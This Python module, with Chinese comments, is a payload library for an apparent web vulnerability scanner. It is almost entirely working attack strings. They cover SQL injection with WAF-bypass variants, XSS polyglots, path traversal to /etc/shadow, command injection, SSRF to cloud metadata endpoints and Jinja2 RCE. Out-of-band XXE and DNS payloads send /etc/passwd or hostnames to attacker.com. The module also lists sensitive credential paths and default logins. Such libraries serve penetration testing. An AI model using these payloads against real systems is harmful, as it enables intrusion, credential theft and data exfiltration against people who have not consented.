"""
Payload Library - 攻击载荷库
包含各类漏洞检测的Payload和指纹库
"""

from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum


class PayloadCategory(Enum):
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    RCE = "rce"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    AUTH_BYPASS = "auth_bypass"
    INFO_DISCLOSURE = "info_disclosure"


@dataclass
class Payload:
    """Payload数据结构"""
    name: str
    category: PayloadCategory
    payload: str
    detection_pattern: str  # 用于验证的正则
    description: str
    severity: str = "medium"
    evasion_level: int = 0  # 0-3, 绕过等级


class PayloadLibrary:
    """攻击载荷库"""
    
    # SQL注入Payload集合
    SQLI_PAYLOADS = [
        # 基础检测
        Payload("sqli_single_quote", PayloadCategory.SQLI, "'", 
                r"(sql|syntax|mysql|postgresql|oracle|sqlite|ORA-\d+|PLS-\d+)",
                "Basic single quote injection", "high", 0),
        Payload("sqli_double_quote", PayloadCategory.SQLI, '"',
                r"(sql|syntax|mysql|postgresql|oracle)",
                "Double quote injection", "high", 0),
        Payload("sqli_comment", PayloadCategory.SQLI, "' OR '1'='1' --",
                r"(sql|syntax|error|warning)",
                "Comment-based bypass", "high", 0),
        
        # 时间盲注
        Payload("sqli_time_mysql", PayloadCategory.SQLI, 
                "' AND SLEEP(5) --",
                r"", "MySQL time-based blind", "high", 1),
        Payload("sqli_time_postgres", PayloadCategory.SQLI,
                "'; SELECT pg_sleep(5) --",
                r"", "PostgreSQL time-based blind", "high", 1),
        Payload("sqli_time_mssql", PayloadCategory.SQLI,
                "'; WAITFOR DELAY '0:0:5' --",
                r"", "MSSQL time-based blind", "high", 1),
        
        # Union注入
        Payload("sqli_union_null", PayloadCategory.SQLI,
                "' UNION SELECT NULL,NULL,NULL --",
                r"(column|select|union)",
                "Union-based NULL injection", "high", 1),
        Payload("sqli_union_version", PayloadCategory.SQLI,
                "' UNION SELECT @@version,NULL,NULL --",
                r"(\d+\.\d+\.\d+|MariaDB|PostgreSQL)",
                "Version extraction via UNION", "critical", 1),
        
        # WAF绕过
        Payload("sqli_waf_bypass_1", PayloadCategory.SQLI,
                "/*!50000' OR '1'='1'*/",
                r"(sql|syntax|error)",
                "MySQL version comment bypass", "high", 2),
        Payload("sqli_waf_bypass_2", PayloadCategory.SQLI,
                "' %0aOR%0a '1'='1' --",
                r"(sql|syntax|error)",
                "Newline bypass", "high", 2),
        Payload("sqli_waf_bypass_3", PayloadCategory.SQLI,
                "'+OR+'1'LIKE'1",
                r"(sql|syntax|error)",
                "LIKE bypass", "high", 2),
    ]
    
    # XSS Payload集合
    XSS_PAYLOADS = [
        # 基础反射
        Payload("xss_basic_script", PayloadCategory.XSS,
                "<script>alert(1)</script>",
                r"<script>alert\(1\)</script>",
                "Basic script tag", "medium", 0),
        Payload("xss_img_onerror", PayloadCategory.XSS,
                '<img src=x onerror=alert(1)>',
                r'<img[^>]*onerror',
                "IMG onerror handler", "medium", 0),
        Payload("xss_svg_onload", PayloadCategory.XSS,
                '<svg onload=alert(1)>',
                r'<svg[^>]*onload',
                "SVG onload handler", "medium", 0),
        
        # 编码绕过
        Payload("xss_html_entity", PayloadCategory.XSS,
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                r'<script>alert',
                "HTML entity encoding", "medium", 1),
        Payload("xss_unicode", PayloadCategory.XSS,
                '<script>\\u0061lert(1)</script>',
                r'alert',
                "Unicode escape", "medium", 1),
        Payload("xss_double_encode", PayloadCategory.XSS,
                '%253Cscript%253Ealert(1)%253C/script%253E',
                r'<script>alert',
                "Double URL encoding", "medium", 2),
        
        # DOM XSS
        Payload("xss_dom_location", PayloadCategory.XSS,
                'javascript:alert(document.domain)',
                r'javascript:',
                "DOM-based via javascript:", "high", 1),
        Payload("xss_dom_hash", PayloadCategory.XSS,
                '#<script>alert(1)</script>',
                r'<script>',
                "Hash-based DOM XSS", "high", 1),
        
        # 高级绕过
        Payload("xss_polyglot", PayloadCategory.XSS,
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                r'(alert|onerror|onload)',
                "XSS polyglot payload", "high", 3),
    ]
    
    # LFI Payload集合
    LFI_PAYLOADS = [
        Payload("lfi_passwd", PayloadCategory.LFI,
                "../../../../etc/passwd",
                r"root:.*:0:0",
                "Linux passwd file", "high", 0),
        Payload("lfi_shadow", PayloadCategory.LFI,
                "../../../../etc/shadow",
                r"\$[1-6]\$",
                "Linux shadow file", "critical", 0),
        Payload("lfi_win_hosts", PayloadCategory.LFI,
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                r"localhost",
                "Windows hosts file", "high", 0),
        Payload("lfi_null_byte", PayloadCategory.LFI,
                "../../../../etc/passwd%00.jpg",
                r"root:.*:0:0",
                "Null byte bypass", "high", 1),
        Payload("lfi_double_encode", PayloadCategory.LFI,
                "..%252f..%252f..%252fetc/passwd",
                r"root:.*:0:0",
                "Double URL encoding", "high", 2),
        Payload("lfi_filter_bypass", PayloadCategory.LFI,
                "....//....//....//etc/passwd",
                r"root:.*:0:0",
                "Filter bypass variant", "high", 1),
        Payload("lfi_php_filter", PayloadCategory.LFI,
                "php://filter/convert.base64-encode/resource=index.php",
                r"^[A-Za-z0-9+/=]+$",
                "PHP filter wrapper", "high", 1),
    ]
    
    # RCE Payload集合
    RCE_PAYLOADS = [
        Payload("rce_cmd_id", PayloadCategory.RCE,
                "; id",
                r"uid=\d+.*gid=\d+",
                "Basic command injection", "critical", 0),
        Payload("rce_cmd_whoami", PayloadCategory.RCE,
                "| whoami",
                r"(root|www-data|apache|nginx|admin)",
                "Pipe whoami", "critical", 0),
        Payload("rce_backtick", PayloadCategory.RCE,
                "`id`",
                r"uid=\d+",
                "Backtick command substitution", "critical", 0),
        Payload("rce_newline", PayloadCategory.RCE,
                "%0aid",
                r"uid=\d+",
                "Newline injection", "critical", 1),
        Payload("rce_dns_exfil", PayloadCategory.RCE,
                "$(hostname).attacker.com",
                r"",
                "DNS exfiltration", "critical", 1),
        Payload("rce_powershell", PayloadCategory.RCE,
                "; powershell -c whoami",
                r"\\",
                "PowerShell command", "critical", 1),
    ]
    
    # SSRF Payload集合
    SSRF_PAYLOADS = [
        Payload("ssrf_localhost", PayloadCategory.SSRF,
                "http://127.0.0.1",
                r"(localhost|127\.0\.0\.1|internal)",
                "Basic localhost", "high", 0),
        Payload("ssrf_metadata_aws", PayloadCategory.SSRF,
                "http://169.254.169.254/latest/meta-data/",
                r"(ami-id|instance-id|iam)",
                "AWS metadata", "critical", 0),
        Payload("ssrf_metadata_gcp", PayloadCategory.SSRF,
                "http://metadata.google.internal/computeMetadata/v1/",
                r"(project|zone|instance)",
                "GCP metadata", "critical", 0),
        Payload("ssrf_metadata_azure", PayloadCategory.SSRF,
                "http://169.254.169.254/metadata/instance",
                r"(compute|network)",
                "Azure metadata", "critical", 0),
        Payload("ssrf_file_proto", PayloadCategory.SSRF,
                "file:///etc/passwd",
                r"root:",
                "File protocol", "critical", 1),
        Payload("ssrf_gopher", PayloadCategory.SSRF,
                "gopher://127.0.0.1:6379/_",
                r"",
                "Gopher protocol for Redis", "critical", 2),
        Payload("ssrf_bypass_decimal", PayloadCategory.SSRF,
                "http://2130706433",  # 127.0.0.1 in decimal
                r"",
                "Decimal IP bypass", "high", 2),
    ]
    
    # XXE Payload集合
    XXE_PAYLOADS = [
        Payload("xxe_basic", PayloadCategory.XXE,
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                r"root:.*:0:0",
                "Basic XXE", "critical", 0),
        Payload("xxe_oob", PayloadCategory.XXE,
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
                r"",
                "Out-of-band XXE", "critical", 1),
        Payload("xxe_parameter", PayloadCategory.XXE,
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]>',
                r"",
                "Parameter entity XXE", "critical", 2),
    ]
    
    # SSTI Payload集合
    SSTI_PAYLOADS = [
        Payload("ssti_jinja2_detect", PayloadCategory.SSTI,
                "{{7*7}}",
                r"49",
                "Jinja2/Twig detection", "high", 0),
        Payload("ssti_jinja2_rce", PayloadCategory.SSTI,
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                r"uid=\d+",
                "Jinja2 RCE", "critical", 1),
        Payload("ssti_freemarker", PayloadCategory.SSTI,
                '${7*7}',
                r"49",
                "Freemarker detection", "high", 0),
        Payload("ssti_velocity", PayloadCategory.SSTI,
                '#set($x=7*7)$x',
                r"49",
                "Velocity detection", "high", 0),
        Payload("ssti_erb", PayloadCategory.SSTI,
                '<%= 7*7 %>',
                r"49",
                "ERB detection", "high", 0),
    ]
    
    # 敏感路径列表
    SENSITIVE_PATHS = [
        # 配置文件
        "/.env", "/config.php", "/wp-config.php", "/configuration.php",
        "/config/database.yml", "/config.yml", "/settings.py",
        "/.git/config", "/.svn/entries", "/.hg/hgrc",
        
        # 备份文件
        "/backup.sql", "/backup.zip", "/backup.tar.gz",
        "/db.sql", "/database.sql", "/dump.sql",
        "/.bak", "/web.config.bak", "/config.php.bak",
        
        # 日志文件
        "/debug.log", "/error.log", "/access.log",
        "/logs/error.log", "/var/log/apache2/error.log",
        
        # 管理界面
        "/admin", "/administrator", "/admin.php",
        "/manager", "/phpmyadmin", "/adminer.php",
        "/wp-admin", "/wp-login.php",
        
        # API文档
        "/swagger.json", "/api-docs", "/swagger-ui.html",
        "/openapi.json", "/graphql", "/graphiql",
        
        # 调试接口
        "/debug", "/trace", "/actuator", "/actuator/health",
        "/actuator/env", "/jolokia", "/.well-known/",
        
        # 源码泄露
        "/.git/HEAD", "/.gitignore", "/robots.txt",
        "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
        
        # 云服务
        "/.aws/credentials", "/.docker/config.json",
        "/kubernetes/config",
    ]
    
    # 默认凭据库
    DEFAULT_CREDENTIALS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("test", "test"), ("guest", "guest"), ("user", "user"),
        ("administrator", "administrator"), ("tomcat", "tomcat"),
        ("manager", "manager"), ("postgres", "postgres"),
        ("mysql", "mysql"), ("oracle", "oracle"),
        ("sa", ""), ("sa", "sa"), ("sa", "password"),
        ("cisco", "cisco"), ("ubnt", "ubnt"),
    ]
    
    # 服务指纹库
    SERVICE_FINGERPRINTS = {
        "apache": [r"Apache/[\d.]+", r"Server: Apache"],
        "nginx": [r"nginx/[\d.]+", r"Server: nginx"],
        "iis": [r"Microsoft-IIS/[\d.]+", r"Server: Microsoft-IIS"],
        "tomcat": [r"Apache-Coyote", r"Apache Tomcat"],
        "php": [r"PHP/[\d.]+", r"X-Powered-By: PHP"],
        "asp.net": [r"ASP\.NET", r"X-AspNet-Version"],
        "django": [r"WSGIServer", r"csrfmiddlewaretoken"],
        "rails": [r"X-Powered-By: Phusion", r"_rails_session"],
        "spring": [r"X-Application-Context", r"Whitelabel Error Page"],
        "express": [r"X-Powered-By: Express"],
        "laravel": [r"laravel_session", r"XSRF-TOKEN"],
        "wordpress": [r"wp-content", r"wp-includes"],
        "joomla": [r"/components/com_", r"Joomla"],
        "drupal": [r"Drupal", r"/sites/default/files"],
    }
    
    @classmethod
    def get_payloads_by_category(cls, category: PayloadCategory) -> List[Payload]:
        """按类别获取Payload"""
        payload_map = {
            PayloadCategory.SQLI: cls.SQLI_PAYLOADS,
            PayloadCategory.XSS: cls.XSS_PAYLOADS,
            PayloadCategory.LFI: cls.LFI_PAYLOADS,
            PayloadCategory.RCE: cls.RCE_PAYLOADS,
            PayloadCategory.SSRF: cls.SSRF_PAYLOADS,
            PayloadCategory.XXE: cls.XXE_PAYLOADS,
            PayloadCategory.SSTI: cls.SSTI_PAYLOADS,
        }
        return payload_map.get(category, [])
    
    @classmethod
    def get_all_payloads(cls) -> List[Payload]:
        """获取所有Payload"""
        all_payloads = []
        all_payloads.extend(cls.SQLI_PAYLOADS)
        all_payloads.extend(cls.XSS_PAYLOADS)
        all_payloads.extend(cls.LFI_PAYLOADS)
        all_payloads.extend(cls.RCE_PAYLOADS)
        all_payloads.extend(cls.SSRF_PAYLOADS)
        all_payloads.extend(cls.XXE_PAYLOADS)
        all_payloads.extend(cls.SSTI_PAYLOADS)
        return all_payloads
    
    @classmethod
    def get_payloads_by_evasion_level(cls, max_level: int) -> List[Payload]:
        """按绕过等级获取Payload"""
        return [p for p in cls.get_all_payloads() if p.evasion_level <= max_level]
    
    @classmethod
    def get_critical_payloads(cls) -> List[Payload]:
        """获取高危Payload"""
        return [p for p in cls.get_all_payloads() if p.severity == "critical"]
